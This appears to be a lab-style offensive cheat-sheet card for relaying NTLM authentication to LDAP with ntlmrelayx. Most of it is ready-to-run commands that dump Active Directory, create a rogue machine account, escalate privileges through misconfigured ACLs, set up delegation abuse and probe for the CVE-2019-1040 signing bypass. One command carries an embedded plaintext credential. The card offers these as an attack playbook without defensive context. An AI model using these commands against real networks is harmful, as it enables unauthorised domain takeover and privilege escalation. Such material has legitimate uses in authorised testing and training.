# 12.07 ntlmrelayx LDAP Relay

> Relay over LDAP/LDAPS for `--add-computer`, `--escalate-user`, or full domain enumeration — wait for HTTP auth when SMB→LDAP fails signing.

## Overview

Relay over LDAP/LDAPS to perform AD operations. SMB-to-LDAP relay fails when the DC enforces signing; wait for HTTP authentication instead, which has no signing. Three attack paths: domain enumeration (--no-da --no-acl), computer account creation (--add-computer), and ACL privilege escalation (--escalate-user). Disable Responder's SMB and HTTP servers first so ntlmrelayx handles both.

## Steps

- Set both SMB = Off and HTTP = Off in Responder.conf when targeting LDAP
- SMB-to-LDAP relay will fail (signing); HTTP-to-LDAP relay succeeds
- no-da --no-acl --lootdir: safe dump-only mode, saves JSON/HTML to folder
- add-computer 'NAME': creates machine account (auto-upgrades ldap:// to StartTLS)
- escalate-user 'ACCOUNT': abuses misconfigured ACLs/DACLs to add account to privileged group
- delegate-access: configure RBCD on the named target (see RBCD card)
- Use CVE-2019-1040 scanner + --remove-mic to relay SMB if DC is unpatched

## Commands

### Disable both servers

```bash
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
```

### LDAP dump

```bash
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump
```

### Add computer account

```bash
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
```

### Escalate via ACL

```bash
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug
```

### CVE-2019-1040 check

```bash
python3 scan.py <DOMAIN>/plaintext$:'o6@ekk5/#rlw2rAe'@172.16.117.3
```

### WebDAV HTTP-to-LDAP relay

```bash
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump
```
